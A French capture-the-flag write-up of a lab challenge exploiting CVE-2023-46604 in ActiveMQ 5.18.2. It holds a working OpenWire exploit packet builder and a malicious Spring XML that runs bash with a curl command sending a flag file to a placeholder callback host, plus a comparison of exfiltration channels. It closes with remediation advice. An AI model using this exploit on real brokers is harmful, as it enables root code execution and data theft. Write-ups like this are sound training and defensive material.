@@ -1,0 +1,463 @@
+# Opération Tervalis
+
+[Accueil](../../README.md) · [Web](../README.md) · [Index](../../INDEX.md)
+
+## Informations générales
+
+| Champ | Valeur |
+|---|---|
+| Nom | Opération Tervalis |
+| Compétition | HackerLab Bénin 2026 |
+| Catégorie de classement | Web |
+| Difficulté | Non documentée |
+| Points | Non documentés |
+| Auteur | Non documenté |
+| Statut | **Partial** |
+| Technologies | ActiveMQ, OpenWire, Spring, HTTP |
+| Validation | Signalement local uniquement (reported) |
+
+## 1. Introduction
+
+Accéder au relais interne pour retrouver la valeur d’instance attendue.
+
+Cette édition reconstruit les travaux conservés. Les commandes citées sont historiques, sauf mention explicite d’un contrôle documentaire local. Aucune cible n’a été contactée lors de la rédaction. Les paramètres d’accès et les réponses sont expurgés ; les remplacer depuis les artefacts autorisés pour une reproduction en laboratoire.
+
+## 2. Énoncé du challenge
+
+- Objectif reconstitué : obtenir la réponse de l’instance via le relais ActiveMQ.
+
+## 3. Analyse initiale
+
+43 fichiers rattachés directement à ce dossier. Voir l’[inventaire des pièces](evidence/manifest.md), qui indique leur chemin d’origine, leur taille et la décision de publication. Les pièces partagées sont référencées dans les questions apparentées, sans recopier les archives.
+
+### 1. État initial et reconnaissance
+
+Source : [writeup-operation-tervalis.md](evidence/operationtervalis-writeup-operation-tervalis-md.txt)
+
+Le point d'entrée est un portail web de coordination de dossiers. Un balayage
+TCP ciblé, limité aux ports usuels de la cible, donne :
+
+| Port | Service | Commentaire |
+|---|---|---|
+| 8080 | HTTP | portail applicatif |
+| 61616 | OpenWire | broker de messages |
+| 1883 | MQTT | broker de messages |
+| 5672 | AMQP | broker de messages |
+
+Les ports 22, 80, 443, 445, 389, 8161, 8081 et 9090 sont fermés. Aucun service
+d'annuaire ni de partage de fichiers n'est exposé sur cette instance.
+
+En-tête du portail :
+
+```text
+Server: BaseHTTP/0.6 Python/3.14.4
+```
+
+`HEAD` et `OPTIONS` renvoient `501`, ce qui correspond à un
+`BaseHTTPRequestHandler` Python sans framework : le routage est probablement
+une suite de comparaisons de chemins.
+
+### 1.1 API découverte
+
+| Route | Méthode | Comportement |
+|---|---|---|
+| `/api/status` | GET | état public : `authenticated`, `relay`, `institution` |
+| `/api/login` | POST | authentification, cookie `session` |
+| `/api/cases` | GET | dossiers, 401 sans session |
+| `/api/messages` | GET | transmissions, 401 sans session |
+| `/api/events` | GET | journal d'activité, 401 sans session |
+
+Réponse publique initiale :
+
+```text
+authenticated=false  relay=true  institution="FBI Valdoria"  user=null
+```
+
+Le champ `relay` indique seulement qu'un relais est *disponible*. Ce n'est pas
+une preuve de compromission : c'est un indice de conception (le portail
+s'appuie sur une messagerie interne).
+
+### 1.2 Contrôle d'accès
+
+Sans session, `/api/cases`, `/api/messages` et `/api/events` renvoient `401`.
+Avec une session valide, un chemin inconnu renvoie `404`. Aucune route cachée
+n'a été trouvée parmi `/api/relay`, `/api/config`, `/api/debug`, `/api/users`,
+`/api/flag`, `/admin`, `/server-status` ou `/.git/HEAD`.
+
+### 1.3 Authentification
+
+```bash
+curl -s -c cj.txt -H 'Content-Type: application/json' \
+  -d '{"username":"analyste","password":"<mot de passe du challenge>"}' \
+  http://172.28.9.3:8080/api/login
+```
+
+Réponse : `200` avec `{"ok": true}` et un cookie :
+
+```text
+Set-Cookie: EXPURGE
+```
+
+Un corps vide renvoie `401` avec un message générique, sans fuite d'information
+sur l'existence du compte.
+
+Le portail affiche ensuite le nom `A. Lindholm`. **Ce nom n'implique aucun
+privilège administratif** : le compte ne donne accès qu'aux six dossiers, au
+journal et à la création de transmissions. Toute hypothèse « admin » aurait été
+une supposition non étayée ; elle n'a pas été utilisée.
+
+### 1.4 Données lisibles
+
+`GET /api/cases` renvoie six dossiers (`VD-2024-0841` à `VD-2024-0782`) :
+infrastructures côtières, accès portuaires, intégrité du réseau administratif,
+etc. `GET /api/messages` est vide au départ. `GET /api/events` journalise les
+connexions et les transmissions créées.
+
+### 1.5 Transmissions
+
+```bash
+curl -s -b cj.txt -H 'Content-Type: application/json' \
+  -H 'Origin: http://172.28.9.3:8080' \
+  -d '{"destination":"Direction nationale","subject":"Test de liaison TERVALIS"}' \
+  http://172.28.9.3:8080/api/messages
+```
+
+Réponse : `{"reference": "TR-188D6B"}`.
+
+La validation serveur est stricte :
+
+- `subject` : 3 à 160 caractères ;
+- `destination` : liste blanche de quatre valeurs — `Direction nationale`,
+  `Antenne Nord`, `Antenne Est`, `Centre KAPPA` ;
+- en-tête `Origin` différent de l'origine du portail : `403` ;
+- corps de plus de 10 000 octets : `413`.
+
+Conclusion : pas d'injection de topic ni de destination par cette API. Le
+portail publie ses transmissions en STOMP sur `localhost:61613`, non exposé.
+
+---
+
+## 4. Reconnaissance et investigation
+
+### 7. Chronologie condensée
+
+Source : [writeup-operation-tervalis.md](evidence/operationtervalis-writeup-operation-tervalis-md.txt)
+
+1. Reconnaissance du portail et des trois ports de messagerie.
+2. Découverte des routes API et du champ `relay`.
+3. Authentification avec le compte fourni par le challenge.
+4. Test des transmissions : validation stricte, pas d'injection.
+5. Identification d'ActiveMQ derrière un proxy qui masque la version.
+6. Confirmation de la version réelle 5.18.2 en post-exploitation.
+7. Exploitation de CVE-2023-46604 pour une exécution root dans le conteneur.
+8. Lecture du fichier de flag unique de l'instance.
+9. Stabilisation de l'exfiltration via `curl`.
+10. Automatisation complète dans `solve.py`.
+
+---
+
+## 5. Identification du mécanisme
+
+La note décrit l’instanciation d’une classe Spring via le décodage OpenWire et le chargement d’un XML contrôlé. La valeur de réponse dépend de l’environnement de l’instance ; une valeur de repli dans le code n’est pas suffisante.
+
+## 6. Exploitation ou résolution
+
+### Opération Tervalis — Write-up
+
+Source : [writeup-operation-tervalis.md](evidence/operationtervalis-writeup-operation-tervalis-md.txt)
+
+- **Plateforme** : HackerLab Bénin 2026
+- **Catégorie** : Web / infrastructure interne
+- **Cible autorisée** : `http://172.28.9.3:8080`
+- **Date de résolution** : 17 novembre 2026
+- **Objectif** : compromettre la chaîne de transmission du portail « FBI Valdoria — Portail de coordination » et récupérer la valeur attendue par la plateforme.
+
+> Toute la valeur finale est désignée dans ce document par « la valeur soumise ».
+> Elle n'apparaît nulle part ici, ni dans les notes, ni dans les commandes.
+
+---
+
+### 2. Le relais interne
+
+Source : [writeup-operation-tervalis.md](evidence/operationtervalis-writeup-operation-tervalis-md.txt)
+
+Le portail ne publie pas l'adresse du relais. Les ports 61616, 1883 et 5672
+étant ouverts sur la même adresse, l'hypothèse retenue est celle d'un broker
+ActiveMQ multi-protocoles.
+
+Une poignée de main OpenWire renvoie une version `0.0.0`, ce qui est
+anormal pour un broker réel. Le doute est levé en post-exploitation : le
+service exposé sur 61616 est un proxy maison, `/opt/owproxy.py`, qui écoute sur
+`0.0.0.0:61616` et relaie vers `127.0.0.1:61617` en réécrivant la chaîne
+`5.18.2` par `0.0.0` sur le premier paquet.
+
+Extrait récupéré après exploitation :
+
+```python
+LISTEN = ('0.0.0.0', 61616)
+BACKEND = ('127.0.0.1', 61617)
+SCRUB = b'5.18.2'
+REPLACE = b'0.0.0'
+```
+
+Le broker réel est donc **ActiveMQ 5.18.2**, installé dans `/opt/activemq`,
+avec `JAVA_VERSION=jdk-11.0.33+10`. Cette version est vulnérable à
+**CVE-2023-46604**.
+
+Point méthodologique : la bannière `0.0.0` aurait pu faire écarter la piste.
+Elle a au contraire été traitée comme une anomalie à expliquer, pas comme une
+version réelle.
+
+---
+
+### 3. CVE-2023-46604 — désérialisation OpenWire
+
+Source : [writeup-operation-tervalis.md](evidence/operationtervalis-writeup-operation-tervalis-md.txt)
+
+### 3.1 Cause racine
+
+Dans ActiveMQ 5.15.0 à 5.18.2, `BaseDataStreamMarshaller.createThrowable`
+instancie la classe nommée dans le champ `exceptionClass` d'un
+`ExceptionResponse` OpenWire, via un constructeur `(String)`. En fournissant
+`org.springframework.context.support.ClassPathXmlApplicationContext`, le broker
+charge un fichier XML Spring contrôlé par l'attaquant. Ce XML peut instancier
+n'importe quel bean, ici un `java.lang.ProcessBuilder` avec `init-method="start"`.
+
+Aucune authentification n'est nécessaire sur OpenWire dans cette configuration.
+
+### 3.2 Trame
+
+```python
+cls = "org.springframework.context.support.ClassPathXmlApplicationContext"
+
+def pack(value):
+    raw = value.encode()
+    return len(raw).to_bytes(2, "big") + raw
+
+body = (
+    bytes.fromhex("1f00000000000000000001")
+    + b"\x01"
+    + pack(cls)
+    + b"\x01"
+    + pack("http://<lhost>:<lport>/poc.xml")
+)
+packet = len(body).to_bytes(4, "big") + body
+```
+
+`0x1f` identifie `ExceptionResponse` ; suivent le champ `exceptionClass`
+(la classe Spring) et le champ `message` (l'URL du XML).
+
+### 3.3 XML servi
+
+```xml
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans
+       http://www.springframework.org/schema/beans/spring-beans.xsd">
+  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+    <constructor-arg><list>
+      <value>bash</value><value>-c</value>
+      <value>curl -s -m 15 --data-binary "$(cat /opt/activemq/data/flag.txt)" http://LHOST:LPORT/exfil</value>
+    </list></constructor-arg>
+  </bean>
+</beans>
+```
+
+### 3.4 Exécution
+
+Le serveur d'attaque reçoit d'abord `GET /poc.xml`, puis un `POST /exfil`
+contenant la sortie de la commande. La preuve d'exécution collectée est :
+
+```text
+uid=0(root) gid=0(root) groups=0(root)
+c7e3e748cc19
+.dockerenv
+/app   -> server.py, app.js, index.html
+/data  -> portal.db
+```
+
+L'exécution est donc **root dans le conteneur du relais**, et non sur l'hôte du
+portail. C'est un point important pour ne pas surinterpréter le résultat.
+
+### 3.5 Choix du canal d'exfiltration
+
+Plusieurs canaux ont été testés dans le conteneur :
+
+| Canal | Résultat |
+|---|---|
+| `/dev/tcp` | aucun callback |
+| `python3 -c` | aucun callback |
+| `wget` | aucun callback |
+| `curl --data-binary` | **succès reproductible** |
+
+Seul `curl` a produit une exfiltration fiable. Le solveur utilise donc
+`curl --data-binary "$(...)"` vers un petit serveur HTTP local.
+
+---
+
+### 4. Origine et unicité de la valeur
+
+Source : [writeup-operation-tervalis.md](evidence/operationtervalis-writeup-operation-tervalis-md.txt)
+
+Recherche de fichiers candidats dans le conteneur du relais :
+
+```bash
+find / -xdev -maxdepth 5 -type f -iname '*flag*' 2>/dev/null
+```
+
+Un seul fichier est retourné, sous `/opt/activemq/data/`. Trois éléments
+confirment qu'il appartient bien à cette instance et pas à une autre cible :
+
+1. il n'existe pas dans le conteneur du portail ;
+2. `/data/portal.db` contient les transmissions créées pendant les tests
+   (`TR-188D6B`, `TR-118EC7`) et les ouvertures de session horodatées ;
+3. la variable `PORTAL_PASSWORD` du conteneur correspond au mot de passe
+   accepté par `/api/login`.
+
+Aucune autre occurrence n'a été trouvée dans `/app`, `/data` ni dans
+l'environnement. Le fichier est donc le secret de cette instance.
+
+---
+
+### 6. Validation reproductible
+
+Source : [writeup-operation-tervalis.md](evidence/operationtervalis-writeup-operation-tervalis-md.txt)
+
+Le solveur `solve.py` (bibliothèque standard uniquement) enchaîne :
+
+1. lecture de `/api/status` et vérification de `relay` ;
+2. authentification et contrôle du cookie de session ;
+3. test de connexion TCP sur le port OpenWire ;
+4. démarrage d'un serveur HTTP local qui sert le XML Spring et capture
+   l'exfiltration ;
+5. envoi de la trame OpenWire ;
+6. capture de la sortie, extraction de la valeur attendue.
+
+```bash
+python3 solve.py --base http://172.28.9.3:8080
+```
+
+Options utiles :
+
+```bash
+python3 solve.py --base http://172.28.9.3:8080 \
+  --user analyste --password '<mot de passe>' \
+  --lhost <ip de callback> --lport 8011 --wait 45
+```
+
+Le script imprime la valeur trouvée ; elle n'est volontairement pas recopiée
+ici. Une équipe peut vérifier la résolution en constatant :
+
+- la réception de `GET /poc.xml` par le serveur local ;
+- la réception d'un `POST /exfil` non vide ;
+- la présence de la valeur attendue dans cette sortie.
+
+---
+
+### 9. Ce qu'il faut retenir
+
+Source : [writeup-operation-tervalis.md](evidence/operationtervalis-writeup-operation-tervalis-md.txt)
+
+- Un indicateur de disponibilité (`relay: true`) n'est pas une preuve : c'est
+  une piste à transformer en observation vérifiable.
+- Une bannière de version falsifiée est un signal, pas une conclusion.
+- Le canal d'exfiltration doit être testé : trois méthodes ont échoué avant
+  `curl`.
+- L'exécution obtenue est confinée au conteneur du relais ; le write-up le dit
+  explicitement pour ne pas exagérer l'impact.
+- La valeur soumise reste hors de ce document, conformément aux règles du
+  challenge.
+
+## 7. Scripts et automatisation
+
+Les deux dérivés Impacket `getST_aes.py` et `getST_nopac.py` restent dans les originaux : ils renvoient à une licence tierce absente du dossier. Ils sont inventoriés mais non redistribués.
+
+Les deux dérivés Impacket `getST_aes.py` et `getST_nopac.py` restent dans les originaux : ils renvoient à une licence tierce absente du dossier. Ils sont inventoriés mais non redistribués.
+
+Les copies sont expurgées et peuvent nécessiter la remise en place de paramètres ou d’artefacts. **Analyse syntaxique uniquement, sans exécution des solveurs ni de leurs opérations réseau.** Les imports listés ne constituent pas un environnement de dépendances testé. Les chemins relatifs historiques peuvent nécessiter une adaptation.
+
+| Script | Source | Imports / dépendances | Contrôle | Nature |
+|---|---|---|---|---|
+| [operationtervalis--bridge.py](scripts/operationtervalis--bridge.py) | `operationtervalis/bridge.py` | socket | syntaxe Python valide | réseau ou interaction de service |
+| [operationtervalis--check_fs01.py](scripts/operationtervalis--check_fs01.py) | `operationtervalis/check_fs01.py` | subprocess | syntaxe Python valide | réseau ou interaction de service |
+| [operationtervalis--exploit.py](scripts/operationtervalis--exploit.py) | `operationtervalis/exploit.py` | argparse, base64, html, http, ipaddress, re, socket, subprocess, threading | syntaxe Python valide | réseau ou interaction de service |
+| [operationtervalis--fs01_enum.py](scripts/operationtervalis--fs01_enum.py) | `operationtervalis/fs01_enum.py` | impacket, os | syntaxe Python valide | réseau ou interaction de service |
+| [operationtervalis--getst_port.py](scripts/operationtervalis--getst_port.py) | `operationtervalis/getst_port.py` | impacket, sys | syntaxe Python valide | traitement local apparent |
+| [operationtervalis--ldap_detail.py](scripts/operationtervalis--ldap_detail.py) | `operationtervalis/ldap_detail.py` | ldap3 | syntaxe Python valide | réseau ou interaction de service |
+| [operationtervalis--ldap_enum.py](scripts/operationtervalis--ldap_enum.py) | `operationtervalis/ldap_enum.py` | ldap3, sys | syntaxe Python valide | réseau ou interaction de service |
+| [operationtervalis--mqtt_listen.py](scripts/operationtervalis--mqtt_listen.py) | `operationtervalis/mqtt_listen.py` | socket | syntaxe Python valide | réseau ou interaction de service |
+| [operationtervalis--mqtt_probe.py](scripts/operationtervalis--mqtt_probe.py) | `operationtervalis/mqtt_probe.py` | socket | syntaxe Python valide | réseau ou interaction de service |
+| [operationtervalis--relay_exec.py](scripts/operationtervalis--relay_exec.py) | `operationtervalis/relay_exec.py` | html | syntaxe Python valide | réseau ou interaction de service |
+| [operationtervalis--reverse_relay.py](scripts/operationtervalis--reverse_relay.py) | `operationtervalis/reverse_relay.py` | select, socket, threading | syntaxe Python valide | réseau ou interaction de service |
+| [operationtervalis--share_scan.py](scripts/operationtervalis--share_scan.py) | `operationtervalis/share_scan.py` | impacket | syntaxe Python valide | réseau ou interaction de service |
+| [operationtervalis--smb_enum.py](scripts/operationtervalis--smb_enum.py) | `operationtervalis/smb_enum.py` | impacket, sys | syntaxe Python valide | réseau ou interaction de service |
+| [operationtervalis--smb_tunnel.py](scripts/operationtervalis--smb_tunnel.py) | `operationtervalis/smb_tunnel.py` | socket | syntaxe Python valide | réseau ou interaction de service |
+| [operationtervalis--solve.py](scripts/operationtervalis--solve.py) | `operationtervalis/solve.py` | __future__, argparse, html, http, json, re, socket, ssl, sys, threading, time, urllib | syntaxe Python valide | réseau ou interaction de service |
+| [operationtervalis--solveur.py](scripts/operationtervalis--solveur.py) | `operationtervalis/solveur.py` | __future__, argparse, html, http, socket, sys, threading, time | syntaxe Python valide | réseau ou interaction de service |
+| [operationtervalis--stomp_client.py](scripts/operationtervalis--stomp_client.py) | `operationtervalis/stomp_client.py` | socket | syntaxe Python valide | réseau ou interaction de service |
+| [operationtervalis--tervalis_rce.py](scripts/operationtervalis--tervalis_rce.py) | `operationtervalis/tervalis_rce.py` | argparse | syntaxe Python valide | réseau ou interaction de service |
+
+## 8. Questions et flags
+
+Les réponses ne sont pas publiées, conformément à la règle locale de non-divulgation. Un signalement au hub ne vaut pas acceptation par la compétition.
+
+| Question / objectif | Méthode et preuve | Réponse | Validation |
+|---|---|---|---|
+| Objectif reconstitué : obtenir la réponse de l’instance via le relais ActiveMQ. | Voir la reconstruction et les sources de ce dossier. | Non reproduite / inconnue si non résolue | Signalement local uniquement (reported) |
+
+## 9. Difficultés rencontrées
+
+### 5. Pistes écartées
+
+Source : [writeup-operation-tervalis.md](evidence/operationtervalis-writeup-operation-tervalis-md.txt)
+
+| Piste | Résultat | Pourquoi elle échoue |
+|---|---|---|
+| MQTT 1883 anonyme | CONNACK `0x00`, SUBACK OK | seuls les topics `ActiveMQ/Advisory/*` sont visibles ; aucune queue du portail |
+| Écoute des queues du portail | aucun message | le portail publie en STOMP sur `localhost:61613`, non exposé |
+| Énumération d'API | tous `404` | le routeur ne connaît que six routes |
+| Injection de destination | refusée | liste blanche serveur de quatre valeurs |
+| Version `0.0.0` du broker | faux négatif | réécriture par `owproxy.py` ; la version réelle est 5.18.2 |
+| Élévation via le compte portail | aucune | le compte n'a aucun rôle administratif démontré |
+
+---
+
+## 10. Analyse technique approfondie
+
+La note décrit l’instanciation d’une classe Spring via le décodage OpenWire et le chargement d’un XML contrôlé. La valeur de réponse dépend de l’environnement de l’instance ; une valeur de repli dans le code n’est pas suffisante. Les critères de validation doivent porter sur les données produites, pas seulement sur l’absence d’erreur d’un outil.
+
+## 11. Remédiations
+
+Mettre à jour le broker, limiter l’exposition d’OpenWire et les sorties réseau, retirer les secrets du périmètre lisible par le service.
+
+### 8. Remédiation
+
+Source : [writeup-operation-tervalis.md](evidence/operationtervalis-writeup-operation-tervalis-md.txt)
+
+- Mettre à jour ActiveMQ vers une version corrigée (au-delà de 5.18.2, ou
+  5.17.6 / 5.16.7 selon la branche).
+- Ne pas exposer OpenWire sur une interface accessible depuis le réseau du
+  portail ; le réserver à un réseau interne segmenté.
+- Remplacer le masquage de version par une vraie maîtrise du périmètre
+  exposé : le proxy ne protège pas d'une exploitation.
+- Filtrer les sorties réseau du conteneur du relais (egress filtering).
+- Exécuter le broker avec un utilisateur non privilégié et un système de
+  fichiers en lecture seule lorsque c'est possible.
+
+---
+
+## 12. Conclusion
+
+Accéder au relais interne pour retrouver la valeur d’instance attendue. La documentation disponible permet une reconstruction détaillée. Statut retenu : Partial. Signalement local uniquement (reported).
+
+## 13. Références
+
+Les références sont les pièces locales ci-dessous. Les références Internet citées dans les notes restent historiques et n’ont pas été consultées pendant cette mission.
+
+- [writeup-operation-tervalis.md](evidence/operationtervalis-writeup-operation-tervalis-md.txt) — origine : `operationtervalis/writeup-operation-tervalis.md`.
+
+- [findings.md](evidence/operationtervalis-findings-md.txt) — origine : `operationtervalis/findings.md`.
+
+- [Inventaire local des pièces](evidence/manifest.md).
+- [Retour à l’index](../../INDEX.md).
+
